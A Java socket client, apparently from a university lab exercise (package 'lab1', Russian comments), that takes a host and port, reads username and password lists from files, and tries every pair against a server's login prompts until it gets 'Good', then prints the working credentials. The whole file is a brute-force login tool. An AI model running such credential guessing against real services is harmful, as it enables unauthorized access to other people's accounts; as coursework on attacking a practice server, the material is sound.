package lab1;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;

import java.util.Scanner;

public class Client {

    private static Socket clientSocket; //сокет для общения
    private static BufferedReader in; // поток чтения из сокета
    private static BufferedWriter out; // поток записи в сокет

    public static void main(String[] args) {
        try {
            try {
                System.out.println("Введите host");
                Scanner scanner = new Scanner(System.in);

                String host = scanner.next();


                System.out.println("Введите port");

                int port = scanner.nextInt();


                clientSocket = new Socket(host, port); // этой строкой мы запрашиваем
//                clientSocket = new Socket("localhost", 4004); // этой строкой мы запрашиваем
                //  у сервера доступ на соединение
                // читать соообщения с сервера
                in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                // писать туда же
                out = new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream()));

                File file = new File("src/lab1/usernames.txt");
                ArrayList<String> usernames = list(file);

                file = new File("src/lab1/passwords.txt");
                ArrayList<String> passwords = list(file);




                String serverWord;
                for (String name : usernames
                ) {
                    for (String pass : passwords
                    ) {

                        serverWord = in.readLine();//Username:

                        // System.out.println(serverWord);

                        out.write(name + "\n"); // отправляем сообщение на сервер
                        out.flush();

                        serverWord = in.readLine();//Password:


                        out.write(pass + "\n"); // отправляем сообщение на сервер
                        out.flush();

                        serverWord = in.readLine(); // ждём, что скажет сервер
                        if (serverWord.equals("Good")) {
                            System.out.println(serverWord + "\n");
                            System.out.println("Username: " + name
                                    + " Password: " + pass + "\n");
                            return;
                        }
                        System.out.println(serverWord + "\n"); // получив - выводим на экран
                    }
                }

            } finally { // в любом случае необходимо закрыть сокет и потоки
                System.out.println("Клиент был закрыт...");
                clientSocket.close();
                in.close();
                out.close();
            }
        } catch (IOException e) {
            System.err.println(e);
        }

    }

    public static ArrayList<String> list(File file) {
        ArrayList<String> list = new ArrayList<>();
        try {
            Scanner scanner = new Scanner(file);
            while (scanner.hasNext()) {
                list.add(scanner.next());
            }

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }


        return list;
    }
}
